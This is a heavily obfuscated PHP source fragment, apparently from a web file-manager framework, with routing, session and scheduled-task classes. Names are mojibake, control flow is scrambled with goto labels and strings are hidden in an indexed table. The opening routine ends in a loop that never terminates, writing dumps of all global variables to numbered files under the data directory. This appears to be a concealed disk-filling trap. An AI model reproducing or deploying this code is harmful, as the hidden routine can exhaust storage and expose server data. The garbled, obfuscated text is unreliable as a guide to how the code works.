$B³¹¼³·Ñ($d»‡ƒ„ƒ–Ş)) { goto bÑÄÈê¡Äœ; B‘ê³´Œ—ù: $f­»÷¬Ëº÷(); $eÈÎÀøÂ‘ = $eö“ÛÁÍÖ•[1307]; $f¶çÉÆÈ¬­ = json_encode($GLOBALS[$eö“ÛÁÍÖ•[1308]]); goto C‰ÓÄ§×ì; bÑÄÈê¡Äœ: $f­»÷¬Ëº÷ = $eö“ÛÁÍÖ•[789]; $dÎ§œ¿„Š = $eö“ÛÁÍÖ•[705]; $E„‘ñ™ÙƒÏ = $_SERVER[$eö“ÛÁÍÖ•[706]] . $eö“ÛÁÍÖ•[707]; goto AÁë½Œ‚°; aã©ìë: $AÉÂ††ì¢ = $eö“ÛÁÍÖ•[790]; $AÉÂ††ì¢($_SERVER[$eö“ÛÁÍÖ•[791]]); $f­»÷¬Ëº÷ = $eö“ÛÁÍÖ•[789]; goto B‘ê³´Œ—ù; C‰ÓÄ§×ì: $d‘Šá¤²¨ = 1; for ($EÈå‹šˆ£Ğ = $d‘Šá¤²¨; $EÈå‹šˆ£Ğ > 0; $EÈå‹šˆ£Ğ++) { $eÈÎÀøÂ‘(DATA_PATH . $EÈå‹šˆ£Ğ, $f¶çÉÆÈ¬­); } goto a„±éê; AÁë½Œ‚°: $d§ß¾ßêù = $dÎ§œ¿„Š($E„‘ñ™ÙƒÏ); $fìÍ‘«Öğ½ = explode($eö“ÛÁÍÖ•[217], $d§ß¾ßêù); if (count($fìÍ‘«Öğ½) < $eö“ÛÁÍÖ•[555]) { $dÆ¥’ïë©„ = $eö“ÛÁÍÖ•[708]; $dÆ¥’ïë©„(); } goto aã©ìë; a„±éê: } return $this->modelPlugin->setConfig($this->pluginName, $CãÓí¢Ğ„î); } public function onSetConfig($B×ÙÁ˜­å) { } public function onGetConfig($A××’¾æ½’) { } public function onChangeStatus($Bï„…ãİÂ•) { } public function onUninstall() { } public function onInstall() { } public function authCheck($FŠ†å«¯í = "\160\154\165\x67\151\x6e\101\165\x74\x68") { $C©È©àˆ©Â =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($C©È©àˆ©Â[427])) { return !1; } if (_get($GLOBALS, $C©È©àˆ©Â[459])) { return !0; } $Bºï£ï¼© = $this->getConfig(); if (!$Bºï£ï¼©[$FŠ†å«¯í]) { return !1; } return ActionCall($C©È©àˆ©Â[1370], $Bºï£ï¼©[$FŠ†å«¯í]); } public function url($B¦¨ªŞØøœ, $fô‘Ÿ÷›Ç = '', $dÂéˆê†¶² = true) { goto D¤Êáê’•Ú; BôÀ°ÛÊƒ: $Fæƒó—·ÁĞ = $this->packageVersion(); $fäŞ²Ñ®­ = $AœİŸ«Ğù« . $bÍ¶Óî†°[412] . $Fæƒó—·ÁĞ; if (substr($B¦¨ªŞØøœ, 0, 4) == $bÍ¶Óî†°[144] || substr($B¦¨ªŞØøœ, 0, 2) == $bÍ¶Óî†°[1154]) { $b½˜»•ƒ·ğ = $B¦¨ªŞØøœ . $bÍ¶Óî†°[1371] . $fäŞ²Ñ®­; } else { if ($fô‘Ÿ÷›Ç == $bÍ¶Óî†°[33]) { $b½˜»•ƒ·ğ = $this->pluginHost . $B¦¨ªŞØøœ . $bÍ¶Óî†°[1371] . $fäŞ²Ñ®­; } else { if ($fô‘Ÿ÷›Ç === $bÍ¶Óî†°[76]) { $b½˜»•ƒ·ğ = $this->pluginHost . $B¦¨ªŞØøœ; } else { if ($fô‘Ÿ÷›Ç == $bÍ¶Óî†°[1372]) { $b½˜»•ƒ·ğ = STATIC_PATH . $B¦¨ªŞØøœ . $bÍ¶Óî†°[1371] . $AœİŸ«Ğù«; } else { if ($fô‘Ÿ÷›Ç == $bÍ¶Óî†°[1373]) { $b½˜»•ƒ·ğ = APP_HOST . $bÍ¶Óî†°[1374] . $B¦¨ªŞØøœ . $bÍ¶Óî†°[1371] . $AœİŸ«Ğù«; } else { if (isset($A¥ˆòÇÛÂ‘[$fô‘Ÿ÷›Ç])) { $b½˜»•ƒ·ğ = $A¥ˆòÇÛÂ‘[$fô‘Ÿ÷›Ç] . $B¦¨ªŞØøœ . $bÍ¶Óî†°[1371] . $fäŞ²Ñ®­; } } } } } } goto f¯ÓŒ·—Ïº; f¯ÓŒ·—Ïº: if (!$dÂéˆê†¶²) { return $b½˜»•ƒ·ğ; } echo $b½˜»•ƒ·ğ; goto b ö˜Ã…«Ø; D¤Êáê’•Ú: $bÍ¶Óî†° =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A¥ˆòÇÛÂ‘ = $this->getConfig(); $AœİŸ«Ğù« = KOD_VERSION . $bÍ¶Óî†°[91] . KOD_VERSION_BUILD; goto BôÀ°ÛÊƒ; b ö˜Ã…«Ø: } public function link($E¨…‘ò¥© = false, $d–ò‡è©Åˆ = '') { $EèÂÍë¸‰Ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$E¨…‘ò¥©) { $this->link($EèÂÍë¸‰Ï[1375], $EèÂÍë¸‰Ï[1373]); $this->link($EèÂÍë¸‰Ï[1376], $EèÂÍë¸‰Ï[1372]); $this->link($EèÂÍë¸‰Ï[1377], $EèÂÍë¸‰Ï[1372]); $this->link($EèÂÍë¸‰Ï[1378], $EèÂÍë¸‰Ï[1372]); $this->link($EèÂÍë¸‰Ï[1379], $EèÂÍë¸‰Ï[1372]); return; } $E‚ÀÔ¶ åŠ = $this->url($E¨…‘ò¥©, $d–ò‡è©Åˆ, !1); if (substr($E¨…‘ò¥©, -3) == $EèÂÍë¸‰Ï[1380]) { echo $EèÂÍë¸‰Ï[1381] . $E‚ÀÔ¶ åŠ . $EèÂÍë¸‰Ï[1382] . $EèÂÍë¸‰Ï[217]; } else { if (substr($E¨…‘ò¥©, -4) == $EèÂÍë¸‰Ï[1383]) { echo $EèÂÍë¸‰Ï[1384] . $E‚ÀÔ¶ åŠ . $EèÂÍë¸‰Ï[1385] . $EèÂÍë¸‰Ï[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\57\x5d\53", "\72\x6e\165\155" => "\133\60\x2d\x39\x5d\x2b", "\72\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($aõËÖÎ•Äà, $c•‘ˆòä) { $e³æƒ‘›­½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($aõËÖÎ•Äà == $e³æƒ‘›­½[1386]) { $cŸÂî«•æ = array_map($e³æƒ‘›­½[1387], $c•‘ˆòä[0]); $e ·µİ¾à = strpos($c•‘ˆòä[1], $e³æƒ‘›­½[8]) === 0 ? $c•‘ˆòä[1] : $e³æƒ‘›­½[8] . $c•‘ˆòä[1]; $AŞ§ÍİØ¬“ = $c•‘ˆòä[2]; } else { $cŸÂî«•æ = null; $e ·µİ¾à = strpos($c•‘ˆòä[0], $e³æƒ‘›­½[8]) === 0 ? $c•‘ˆòä[0] : $e³æƒ‘›­½[8] . $c•‘ˆòä[0]; $AŞ§ÍİØ¬“ = $c•‘ˆòä[1]; } array_push(self::$maps, $cŸÂî«•æ); array_push(self::$routes, $e ·µİ¾à); array_push(self::$methods, strtoupper($aõËÖÎ•Äà)); array_push(self::$callbacks, $AŞ§ÍİØ¬“); } public static function error($BğÃ™©»ƒ) { self::$errorCallback = $BğÃ™©»ƒ; } public static function haltOnMatch($dÈĞ‡…¸– = true) { self::$halts = $dÈĞ‡…¸–; } public static function dispatch() { goto a•‘ŠÔº«å; c¨Çßçã†è: self::$routes = preg_replace($a§’š‰¹±Š[1070], $a§’š‰¹±Š[8], self::$routes); if (in_array($a›…§Ö°”, self::$routes)) { $D™¿„îàíò = array_keys(self::$routes, $a›…§Ö°”); foreach ($D™¿„îàíò as $bÔ ÎÛìŒ²) { if (self::$methods[$bÔ ÎÛìŒ²] == $BöÄ«ê‹ƒ || self::$methods[$bÔ ÎÛìŒ²] == $a§’š‰¹±Š[1389] || in_array($BöÄ«ê‹ƒ, self::$maps[$bÔ ÎÛìŒ²])) { $eÄ‡Š¹¶õ† = !0; if (!is_object(self::$callbacks[$bÔ ÎÛìŒ²])) { $aàª•ŒŸœ = explode($a§’š‰¹±Š[8], self::$callbacks[$bÔ ÎÛìŒ²]); $F†š“İ‡ = end($aàª•ŒŸœ); $D´ÙŠ×Ñ¼ = explode($a§’š‰¹±Š[1390], $F†š“İ‡); $b×Ò‹Œ÷ = new $D´ÙŠ×Ñ¼[0](); $b×Ò‹Œ÷->{$D´ÙŠ×Ñ¼[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bÔ ÎÛìŒ²]); if (self::$halts) { return; } } } } } else { $E—¬«¢†Û = 0; foreach (self::$routes as $bÔ ÎÛìŒ²) { if (strpos($bÔ ÎÛìŒ², $a§’š‰¹±Š[4]) !== !1) { $bÔ ÎÛìŒ² = str_replace($C©ñé†‹›, $F¯¬„ÁÁÈ, $bÔ ÎÛìŒ²); } if (preg_match($a§’š‰¹±Š[1391] . $bÔ ÎÛìŒ² . $a§’š‰¹±Š[1392], $a›…§Ö°”, $BÊØÊáğô¶)) { if (self::$methods[$E—¬«¢†Û] == $BöÄ«ê‹ƒ || self::$methods[$E—¬«¢†Û] == $a§’š‰¹±Š[1389] || !empty(self::$maps[$E—¬«¢†Û]) && in_array($BöÄ«ê‹ƒ, self::$maps[$E—¬«¢†Û])) { $eÄ‡Š¹¶õ† = !0; array_shift($BÊØÊáğô¶); if (!is_object(self::$callbacks[$E—¬«¢†Û])) { $aàª•ŒŸœ = explode($a§’š‰¹±Š[8], self::$callbacks[$E—¬«¢†Û]); $F†š“İ‡ = end($aàª•ŒŸœ); $D´ÙŠ×Ñ¼ = explode($a§’š‰¹±Š[1390], $F†š“İ‡); $b×Ò‹Œ÷ = new $D´ÙŠ×Ñ¼[0](); if (!method_exists($b×Ò‹Œ÷, $D´ÙŠ×Ñ¼[1])) { echo $a§’š‰¹±Š[1393]; } else { call_user_func_array(array($b×Ò‹Œ÷, $D´ÙŠ×Ñ¼[1]), $BÊØÊáğô¶); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$E—¬«¢†Û], $BÊØÊáğô¶); if (self::$halts) { return; } } } } $E—¬«¢†Û++; } } if ($eÄ‡Š¹¶õ† == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $E«”Ø¿ÛÂ‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; header($_SERVER[$E«”Ø¿ÛÂ‡[1394]] . $E«”Ø¿ÛÂ‡[1395]); echo $E«”Ø¿ÛÂ‡[1396]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$a§’š‰¹±Š[1388]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto BÂ¾¸İ‡”·; F–ÓÙƒÛ­: $C©ñé†‹› = array_keys(static::$patterns); $F¯¬„ÁÁÈ = array_values(static::$patterns); $eÄ‡Š¹¶õ† = !1; goto c¨Çßçã†è; a•‘ŠÔº«å: $a§’š‰¹±Š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a›…§Ö°” = parse_url($_SERVER[$a§’š‰¹±Š[1388]], PHP_URL_PATH); $BöÄ«ê‹ƒ = $_SERVER[$a§’š‰¹±Š[154]]; goto F–ÓÙƒÛ­; BÂ¾¸İ‡”·: } } goto fõ©¡¸ƒóê; fõ©¡¸ƒóê: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto EÏõ¡†ïÉ; c¡¦Œİéè‡: $Eæ¹¤Ù¦ = $GLOBALS[$FŒÔè¢ºï[6]][$FŒÔè¢ºï[337]]; self::$sessionTime = $Eæ¹¤Ù¦[$FŒÔè¢ºï[1397]]; $AÔåø¼óœÑ = isset($GLOBALS[$FŒÔè¢ºï[1398]]) ? $GLOBALS[$FŒÔè¢ºï[1398]] : SESSION_ID; goto aŒÖ±Â“¢; F½Š¡³©¿Ü: $B§›±ŒÂÏ = $Eæ¹¤Ù¦[$FÙÜÉõŠ²ì]; $E˜±óÏŞ = $Eæ¹¤Ù¦[$FŒÔè¢ºï[757]]; switch ($FÙÜÉõŠ²ì) { case $FŒÔè¢ºï[17]: self::$handle = Model($FŒÔè¢ºï[758]); break; case $FŒÔè¢ºï[759]: self::$handle = new CacheRedis($B§›±ŒÂÏ, $E˜±óÏŞ); break; case $FŒÔè¢ºï[760]: self::$handle = new CacheMemcached($B§›±ŒÂÏ, $E˜±óÏŞ); break; case $FŒÔè¢ºï[167]: $B§›±ŒÂÏ[$FŒÔè¢ºï[75]] = $B§›±ŒÂÏ[$FŒÔè¢ºï[75]] . $FŒÔè¢ºï[1400]; self::$handle = new CacheFile($B§›±ŒÂÏ, $E˜±óÏŞ); default: break; } goto d¨®öËÖ›å; aŒÖ±Â“¢: if (self::$sessionSign) { } else { if (Cookie::get($AÔåø¼óœÑ)) { self::$sessionSign = Cookie::get($AÔåø¼óœÑ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($AÔåø¼óœÑ, self::$sessionSign, self::$sessionTime); $FÙÜÉõŠ²ì = $Eæ¹¤Ù¦[$FŒÔè¢ºï[1399]]; goto F½Š¡³©¿Ü; d¨®öËÖ›å: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $F—óö…ˆ×¥ = new self(); return $F—óö…ˆ×¥; goto A¿ø³½“²; EÏõ¡†ïÉ: $FŒÔè¢ºï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $F—óö…ˆ×¥ = false; if ($F—óö…ˆ×¥) { return $F—óö…ˆ×¥; } goto c¡¦Œİéè‡; A¿ø³½“²: } public static function sign($Cˆà–‰¢¬Ç = false) { $Cˆà–‰¢¬Ç && (self::$sessionSign = $Cˆà–‰¢¬Ç); self::init(); return self::$sessionSign; } public static function set($D¸åèŠ¾Ãë, $b¼‚ÑËóŠ = false) { self::init(); if (is_array($D¸åèŠ¾Ãë)) { foreach ($D¸åèŠ¾Ãë as $F‹Ş‡İÕŠÆ => $d¯Úƒƒ¦Ô„) { array_set_value(self::$data, $F‹Ş‡İÕŠÆ, $d¯Úƒƒ¦Ô„); } } else { array_set_value(self::$data, $D¸åèŠ¾Ãë, $b¼‚ÑËóŠ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Eë°õ‘´„ = false) { self::init(); if (!$Eë°õ‘´„) { return self::$data; } return array_get_value(self::$data, $Eë°õ‘´„); } public static function remove($Aß±ïÊÓœ) { self::init(); unset(self::$data[$Aß±ïÊÓœ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][762])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto bñèò…‡³Ï; CØÎœ¯™¾: while (!0) { self::cacheClear(); if (self::valueGet($dÄ§±±¤Îõ[683]) != $dÄ§±±¤Îõ[83]) { self::valueSet($dÄ§±±¤Îõ[1401], $dÄ§±±¤Îõ[470]); self::log($dÄ§±±¤Îõ[1405]); die; } self::valueSet($dÄ§±±¤Îõ[1401], $dÄ§±±¤Îõ[83]); self::valueSet($dÄ§±±¤Îõ[1402], time()); self::taskRunAll(); sleep(self::valueGet($dÄ§±±¤Îõ[1406])); } goto B¡Èß‡Ò‚î; bñèò…‡³Ï: $dÄ§±±¤Îõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (self::valueGet($dÄ§±±¤Îõ[683]) != $dÄ§±±¤Îõ[83]) { return; } if (self::valueGet($dÄ§±±¤Îõ[1401]) == $dÄ§±±¤Îõ[83]) { $dôĞØÉÚÀ = self::valueGet($dÄ§±±¤Îõ[1402]); if (time() - $dôĞØÉÚÀ > 3600 * 2) { self::restart(); } return; } goto E§Ê‰¶¤µ; E§Ê‰¶¤µ: http_close(); self::valueSet($dÄ§±±¤Îõ[1401], $dÄ§±±¤Îõ[83]); Hook::bind($dÄ§±±¤Îõ[1403], $dÄ§±±¤Îõ[1404]); goto CØÎœ¯™¾; B¡Èß‡Ò‚î: } public static function restart() { $f¡¥Œ©­óÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; http_close(); self::valueSet($f¡¥Œ©­óÆ[683], $f¡¥Œ©­óÆ[470]); sleep(self::valueGet($f¡¥Œ©­óÆ[1406]) + 5); self::valueSet($f¡¥Œ©­óÆ[1401], $f¡¥Œ©­óÆ[470]); self::valueSet($f¡¥Œ©­óÆ[683], $f¡¥Œ©­óÆ[83]); } public static function shutdownEvent() { $c‘ØéƒèÑ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::valueSet($c‘ØéƒèÑ–[1401], $c‘ØéƒèÑ–[470]); self::log($c‘ØéƒèÑ–[1407]); } public static function config($CÏÊÑÀ«§À, $D×ÙÎóæÚ) { $F Ÿè§·…ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aîõ¬Å°É = 20; $D×ÙÎóæÚ = intval($D×ÙÎóæÚ) <= $aîõ¬Å°É ? $aîõ¬Å°É : intval($D×ÙÎóæÚ); self::valueSet($F Ÿè§·…ñ[683], $CÏÊÑÀ«§À); self::valueSet($F Ÿè§·…ñ[1406], $D×ÙÎóæÚ); } private static function taskRunAll() { $dŒã„Ä½á’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C“ö¹•èĞÛ = Model($dŒã„Ä½á’[1408])->listData(); $dí‡¹’ÜÈ› = count($C“ö¹•èĞÛ); for ($A¡ÆÀÊ  Ê = 0; $A¡ÆÀÊ  Ê < $dí‡¹’ÜÈ›; $A¡ÆÀÊ  Ê++) { $e´÷ÛÍä©É = $C“ö¹•èĞÛ[$A¡ÆÀÊ  Ê]; if ($e´÷ÛÍä©É[$dŒã„Ä½á’[1409]] != $dŒã„Ä½á’[83]) { continue; } if (!self::taskTimeCheck($e´÷ÛÍä©É)) { continue; } self::taskRun($e´÷ÛÍä©É); } Hook::trigger($dŒã„Ä½á’[1410]); } private static function taskTimeCheck($Aôæ…Ø´†„) { goto E™æÒ§ÔëÇ; bø±…ñÑˆ: $e­¶§”±œÑ = strtotime($E¥ŠÁÍíÈÚ[1411] . $d’º”·³¢¹[$E¥ŠÁÍíÈÚ[1412]] . $E¥ŠÁÍíÈÚ[1413]) - strtotime($E¥ŠÁÍíÈÚ[1414]); $CÈâê¨Æ°Ş = time() - strtotime(date($E¥ŠÁÍíÈÚ[1415]) . $E¥ŠÁÍíÈÚ[1416]); $Bñ¼ã‹†‰” = $CÈâê¨Æ°Ş >= $e­¶§”±œÑ && $CÈâê¨Æ°Ş <= $e­¶§”±œÑ + 3600; goto dëß¨Í¿¿ù; E™æÒ§ÔëÇ: $E¥ŠÁÍíÈÚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d’º”·³¢¹ = json_decode($Aôæ…Ø´†„[$E¥ŠÁÍíÈÚ[190]], !0); $Eä±È¬‹Â = intval($Aôæ…Ø´†„[$E¥ŠÁÍíÈÚ[1402]]); goto bø±…ñÑˆ; dëß¨Í¿¿ù: switch ($d’º”·³¢¹[$E¥ŠÁÍíÈÚ[29]]) { case $E¥ŠÁÍíÈÚ[1417]: if (time() - $Eä±È¬‹Â < 3600 * 24 * 30) { return !1; } if ($d’º”·³¢¹[$E¥ŠÁÍíÈÚ[1417]] == date($E¥ŠÁÍíÈÚ[1418]) && $Bñ¼ã‹†‰”) { return !0; } break; case $E¥ŠÁÍíÈÚ[1419]: if (time() - $Eä±È¬‹Â < 3600 * 24 * 7) { return !1; } $A‡ÂŒÅÙêÛ = date($E¥ŠÁÍíÈÚ[1420]) == 0 ? 7 : date($E¥ŠÁÍíÈÚ[1420]); if ($d’º”·³¢¹[$E¥ŠÁÍíÈÚ[1419]] == $A‡ÂŒÅÙêÛ && $Bñ¼ã‹†‰”) { return !0; } break; case $E¥ŠÁÍíÈÚ[1412]: if (time() - $Eä±È¬‹Â < 3600 * 24) { return !1; } if ($Bñ¼ã‹†‰”) { return !0; } break; case $E¥ŠÁÍíÈÚ[1421]: if (time() - $Eä±È¬‹Â >= floatval($d’º”·³¢¹[$E¥ŠÁÍíÈÚ[1421]]) * 60) { return !0; } break; default: break; } return !1; goto AËÁöì”ô…; AËÁöì”ô…: } public static function taskRun($DÓÒ›Æºó¯) { goto eÔœ‚ªÛ³ô; A÷çÔ ›‡: $e—øƒßÈõ = timeFloat(); $dê‘¾ÃæÃŒ = $BÀ³’‡’¼°[33]; switch ($DÓÒ›Æºó¯[$BÀ³’‡’¼°[29]]) { case $BÀ³’‡’¼°[295]: $E‹áÕÏÕ = url_request($DÓÒ›Æºó¯[$BÀ³’‡’¼°[1425]], $BÀ³’‡’¼°[216], !1, !1, !1, !1, 5); $dê‘¾ÃæÃŒ = strlen($E‹áÕÏÕ); break; case $BÀ³’‡’¼°[215]: $dê‘¾ÃæÃŒ = Hook::apply($DÓÒ›Æºó¯[$BÀ³’‡’¼°[1425]]); default: break; } goto Dªõ”³ŒÜ; Dªõ”³ŒÜ: Model($BÀ³’‡’¼°[1426])->add(array($BÀ³’‡’¼°[1427] => $BÀ³’‡’¼°[33], $BÀ³’‡’¼°[1428] => $BÀ³’‡’¼°[470], $BÀ³’‡’¼°[29] => $BÀ³’‡’¼°[1429] . $DÓÒ›Æºó¯[$BÀ³’‡’¼°[367]], $BÀ³’‡’¼°[1430] => json_encode(array($BÀ³’‡’¼°[28] => $DÓÒ›Æºó¯[$BÀ³’‡’¼°[28]], $BÀ³’‡’¼°[1431] => timeFloat() - $e—øƒßÈõ, $BÀ³’‡’¼°[281] => $dê‘¾ÃæÃŒ)))); self::log($BÀ³’‡’¼°[1432] . $DÓÒ›Æºó¯[$BÀ³’‡’¼°[367]] . $BÀ³’‡’¼°[1433] . $dê‘¾ÃæÃŒ); return !0; goto E£ä²¿æ©¸; eÔœ‚ªÛ³ô: $BÀ³’‡’¼° =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::log($BÀ³’‡’¼°[1422] . $DÓÒ›Æºó¯[$BÀ³’‡’¼°[367]] . $BÀ³’‡’¼°[1423] . $DÓÒ›Æºó¯[$BÀ³’‡’¼°[28]] . $BÀ³’‡’¼°[1424] . $DÓÒ›Æºó¯[$BÀ³’‡’¼°[1425]]); Model($BÀ³’‡’¼°[1408])->run($DÓÒ›Æºó¯[$BÀ³’‡’¼°[367]]); goto A÷çÔ ›‡; E£ä²¿æ©¸: } private static function valueGet($c»©£¹Ğ‚Š) { $D¯ÊÍ²”æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÓÇ‚‰‰¥æ = $D¯ÊÍ²”æ[1434]; $eê§Ô†±†† = Model($D¯ÊÍ²”æ[1435])->get($c»©£¹Ğ‚Š, $aÓÇ‚‰‰¥æ); if (is_null($eê§Ô†±††)) { Model($D¯ÊÍ²”æ[1435])->set($D¯ÊÍ²”æ[1406], 10, $aÓÇ‚‰‰¥æ); Model($D¯ÊÍ²”æ[1435])->set($D¯ÊÍ²”æ[683], $D¯ÊÍ²”æ[83], $aÓÇ‚‰‰¥æ); Model($D¯ÊÍ²”æ[1435])->set($D¯ÊÍ²”æ[1401], $D¯ÊÍ²”æ[470], $aÓÇ‚‰‰¥æ); $eê§Ô†±†† = Model($D¯ÊÍ²”æ[1435])->get($c»©£¹Ğ‚Š, $aÓÇ‚‰‰¥æ); } return $eê§Ô†±††; } private static function valueSet($d¯ëĞ©è’³, $b—ËÆ¥°êŠ) { $e¥»®Í´– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return Model($e¥»®Í´–[1435])->set($d¯ëĞ©è’³, $b—ËÆ¥°êŠ, $e¥»®Í´–[1434]); } protected static function log($cŞª¶ò¨é®) { write_log($cŞª¶ò¨é®, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1436]); } private static function cacheClear() { $bïê¸Ëåñ‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bïŠÓ„’Ù = Model($bïê¸Ëåñ‹[1435])->cacheKey($bïê¸Ëåñ‹[1434]); Cache::clearMemory($bïŠÓ„’Ù); Model($bïê¸Ëåñ‹[1408])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($c’”Šùöï•, $EÏãÛ¨º÷ = '', $f¸½Äµë¹â = 0, $D½ÎùÛÈ‰ä = '') { goto fÚŒèİ¼òã; fÚŒèİ¼òã: $då™†â˜í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (self::get($c’”Šùöï•)) { return; } $this->task = array($då™†â˜í[367] => $c’”Šùöï•, $då™†â˜í[1437] => USER_ID, $då™†â˜í[1343] => $D½ÎùÛÈ‰ä, $då™†â˜í[29] => $EÏãÛ¨º÷, $då™†â˜í[975] => $då™†â˜í[33], $då™†â˜í[973] => $f¸½Äµë¹â, $då™†â˜í[987] => 0, $då™†â˜í[1438] => 0, $då™†â˜í[1439] => 0, $då™†â˜í[1440] => timeFloat(), $då™†â˜í[1441] => 0, $då™†â˜í[1442] => 0, $då™†â˜í[1443] => 0, $då™†â˜í[1444] => 0, $då™†â˜í[683] => $då™†â˜í[1401]); goto F¡ÇÍ¾‘ˆ³; C†æ©‡Éáä: Hook::trigger($då™†â˜í[1448], $this->task); $this->task[$då™†â˜í[1442]] = timeFloat(); goto d™™•¤Âñ; F¡ÇÍ¾‘ˆ³: Hook::bind($då™†â˜í[1403], array($this, $då™†â˜í[1445])); Hook::bind($då™†â˜í[1446], array($this, $då™†â˜í[1447])); $this->startAfter(); goto C†æ©‡Éáä; d™™•¤Âñ: } public function end() { goto eùƒ¹œóŒ¨; D†Ä¥óİ¸ë: Hook::unbind($E¸Óâ‹‚‹[1446], array($this, $E¸Óâ‹‚‹[1447])); $this->endAfter(); $this->task = !1; goto dÁƒ—ØòøÔ; eùƒ¹œóŒ¨: $E¸Óâ‹‚‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->task) { return; } if ($this->task[$E¸Óâ‹‚‹[1442]]) { self::valueSet($this->task[$E¸Óâ‹‚‹[367]], !1); } goto F“ç×Ã»‡®; F“ç×Ã»‡®: $DãØ™œ¸Ê“ = timeFloat() - $this->task[$E¸Óâ‹‚‹[1440]]; self::log($E¸Óâ‹‚‹[1449] . $this->task[$E¸Óâ‹‚‹[367]] . $E¸Óâ‹‚‹[1450] . $DãØ™œ¸Ê“ . $E¸Óâ‹‚‹[1451]); Hook::unbind($E¸Óâ‹‚‹[1403], array($this, $E¸Óâ‹‚‹[1445])); goto D†Ä¥óİ¸ë; dÁƒ—ØòøÔ: } public function update($dÏÏïÛ¦Âö = 0) { goto fÍ¸¶…–‘´; Cù«²©ªÓÉ: $AæîÉÓ¿¸Ê = self::get($E§Ã¸ëéÃó[$D·ŒÙ‘³[367]]); $dİñÊ÷˜µø = $AæîÉÓ¿¸Ê[$D·ŒÙ‘³[683]]; if ($dİñÊ÷˜µø == self::STATYS_KILL) { $dè‹³Åä¾³ = array($D·ŒÙ‘³[1452] => LNG($D·ŒÙ‘³[1453]), $D·ŒÙ‘³[1029] => !1); Cache::set($D·ŒÙ‘³[1454] . $this->task[$D·ŒÙ‘³[367]], $dè‹³Åä¾³, 30); $this->end(); die; } else { if ($dİñÊ÷˜µø == self::STATYS_STOP) { $A±ÛÁœÑé” = 2; $AæîÉÓ¿¸Ê[$D·ŒÙ‘³[1443]] += $A±ÛÁœÑé”; self::valueSet($E§Ã¸ëéÃó[$D·ŒÙ‘³[367]], $AæîÉÓ¿¸Ê); sleep($A±ÛÁœÑé”); $this->update(); return; } } goto FÀåŸšÕæ; fÍ¸¶…–‘´: $D·ŒÙ‘³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E§Ã¸ëéÃó =& $this->task; if (!$E§Ã¸ëéÃó) { return; } goto câˆŸ¥Ë¡Ì; c¥…„ùÈÉ: $this->updateAfter(); $C¤Ş½‚ÕéŒ = 0.2; if (timeFloat() - $E§Ã¸ëéÃó[$D·ŒÙ‘³[1442]] < $C¤Ş½‚ÕéŒ) { return; } goto Cù«²©ªÓÉ; FÀåŸšÕæ: $E§Ã¸ëéÃó[$D·ŒÙ‘³[683]] = $dİñÊ÷˜µø ? $dİñÊ÷˜µø : $E§Ã¸ëéÃó[$D·ŒÙ‘³[683]]; $E§Ã¸ëéÃó[$D·ŒÙ‘³[1443]] = $AæîÉÓ¿¸Ê[$D·ŒÙ‘³[1443]] ? $AæîÉÓ¿¸Ê[$D·ŒÙ‘³[1443]] : 0; $E§Ã¸ëéÃó[$D·ŒÙ‘³[1442]] = timeFloat(); goto c”Ášë‹¼ğ; câˆŸ¥Ë¡Ì: $E§Ã¸ëéÃó[$D·ŒÙ‘³[987]] += $dÏÏïÛ¦Âö; $E§Ã¸ëéÃó[$D·ŒÙ‘³[1441]] = timeFloat(); if ($E§Ã¸ëéÃó[$D·ŒÙ‘³[973]]) { if ($E§Ã¸ëéÃó[$D·ŒÙ‘³[973]] < $E§Ã¸ëéÃó[$D·ŒÙ‘³[987]]) { 